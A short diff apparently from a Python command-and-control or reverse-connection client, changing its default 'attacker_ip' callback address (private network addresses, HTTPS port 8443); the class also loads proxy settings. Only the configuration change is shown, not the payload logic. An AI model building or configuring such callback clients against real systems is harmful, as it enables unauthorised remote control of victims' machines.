@@ -7,7 +7,7 @@ import ssl
 import platform
 
 class Client:
-    def __init__(self, attacker_ip='192.168.18.128', https_port=8443):
+    def __init__(self, attacker_ip='10.118.24.13', https_port=8443):
         self.attacker_ip = attacker_ip
         self.https_port = https_port
         self.proxy = self.get_proxy_settings()
